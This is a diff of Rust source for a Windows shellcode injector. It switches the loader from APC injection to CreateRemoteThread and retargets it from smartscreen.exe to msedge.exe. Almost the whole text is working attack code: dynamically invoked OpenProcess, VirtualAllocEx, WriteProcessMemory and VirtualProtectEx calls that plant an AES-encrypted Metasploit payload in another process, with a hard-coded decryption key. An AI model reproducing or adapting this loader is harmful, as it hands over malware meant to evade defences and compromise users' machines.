@@ -1,6 +1,4 @@
-use data::{
-    OpenProcess, OpenThread, QueueUserAPC, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory,
-};
+use data::{CreateRemoteThread, OpenProcess, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
 use data::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE};
 use libaes::Cipher;
 use random_string::generate;
@@ -43,6 +41,7 @@ fn boxboxbox(tar: &str) -> Vec<u32> {
     let mut dom: Vec<u32> = Vec::new();
     let s = System::new_all();
     for pro in s.processes_by_exact_name(tar) {
+        //println!("{} {}", pro.pid(), pro.name());
         dom.push(pro.pid().as_u32());
     }
     return dom;
@@ -50,12 +49,13 @@ fn boxboxbox(tar: &str) -> Vec<u32> {
 
 fn enhance(buf: &[u8], tar: &u32) {
     // injecting in target processes :)
+
     println!("[+] Targeting {}", tar);
 
     let kernel32 = dinvoke::get_module_base_address("kernel32.dll");
-    let process = remoteprocess::Process::new(*tar);
 
     unsafe {
+        //let hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
         let hProcess;
         let all_access = 0xFFFF;
         let function_type: OpenProcess;
@@ -70,6 +70,7 @@ fn enhance(buf: &[u8], tar: &u32) {
         );
 
         if let Some(hProcess) = hProcess {
+            //let resultPtr = VirtualAllocEx(hProcess, null(), buf.len(), MEM_COMMIT, PAGE_READWRITE);
             let resultPtr;
             let function_type2: VirtualAllocEx;
             dinvoke::dynamic_invoke!(
@@ -83,60 +84,51 @@ fn enhance(buf: &[u8], tar: &u32) {
                 MEM_COMMIT,
                 PAGE_READWRITE
             );
-            let mut _resultBool;
+            let mut resultBool;
             let function_type3: WriteProcessMemory;
             let mut byteswritten = 0;
             dinvoke::dynamic_invoke!(
                 kernel32,
                 "WriteProcessMemory",
                 function_type3,
-                _resultBool,
+                resultBool,
                 hProcess,
                 resultPtr.unwrap(),
                 buf.as_ptr() as _,
                 buf.len(),
                 &mut byteswritten
             );
-            for thread in process.unwrap().threads().unwrap().iter() {
-                println!("Found thread {}", thread.id().unwrap());
-                let function_type4: OpenThread;
-                let handle;
-                dinvoke::dynamic_invoke!(
-                    kernel32,
-                    "OpenThread",
-                    function_type4,
-                    handle,
-                    0xFFFF, //THREAD_ALL_ACCESS
-                    bindings::Windows::Win32::Foundation::BOOL::from(false),
-                    thread.id().unwrap()
-                );
 
-                let mut old_perms = PAGE_EXECUTE_READ;
-                let function_type5: VirtualProtectEx;
-                dinvoke::dynamic_invoke!(
-                    kernel32,
-                    "VirtualProtectEx",
-                    function_type5,
-                    _resultBool,
-                    hProcess,
-                    resultPtr.unwrap(),
-                    buf.len(),
-                    PAGE_EXECUTE_READ,
-                    &mut old_perms
-                );
-                //thanks Nick12
-                let function_type6: QueueUserAPC;
-                let _qua;
-                dinvoke::dynamic_invoke!(
-                    kernel32,
-                    "QueueUserAPC",
-                    function_type6,
-                    _qua,
-                    Some(std::mem::transmute(resultPtr.unwrap())),
-                    handle.unwrap(),
-                    0
-                );
-            }
+            //VirtualProtectEx(hProcess, resultPtr, buf.len(), PAGE_EXECUTE_READ, &mut old_perms);
+            let mut old_perms = PAGE_EXECUTE_READ;
+            let function_type4: VirtualProtectEx;
+            dinvoke::dynamic_invoke!(
+                kernel32,
+                "VirtualProtectEx",
+                function_type4,
+                resultBool,
+                hProcess,
+                resultPtr.unwrap(),
+                buf.len(),
+                PAGE_EXECUTE_READ,
+                &mut old_perms
+            );
+
+            let _resCRT;
+            let function_type5: CreateRemoteThread;
+            dinvoke::dynamic_invoke!(
+                kernel32,
+                "CreateRemoteThread",
+                function_type5,
+                _resCRT,
+                hProcess,
+                null_mut(),
+                0,
+                Some(std::mem::transmute(resultPtr.unwrap())),
+                null_mut(),
+                0,
+                null_mut()
+            );
         }
     }
 }
@@ -162,7 +154,7 @@ fn aes_256_decrypt(shellcode: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8
 
 fn main() {
     // inject in the following processes:
-    let tar: &str = "smartscreen.exe";
+    let tar: &str = "msedge.exe";
 
     // aes encrypted msf shellcode :
     let enc_buf: Vec<u8> = vec![
@@ -229,7 +221,6 @@ fn main() {
     } else {
         let buf: Vec<u8> = aes_256_decrypt(
             // thanks again to https://github.com/memN0ps/arsenal-rs/blob/ee385df07805515da5ffc2a9900d51d24a47f9ab/obfuscate_shellcode-rs/src/main.rs
-
             &enc_buf,
             b"ABCDEFGHIJKLMNOPQRSTUVWXYZ-01337",
             b"This is 16 bytes",
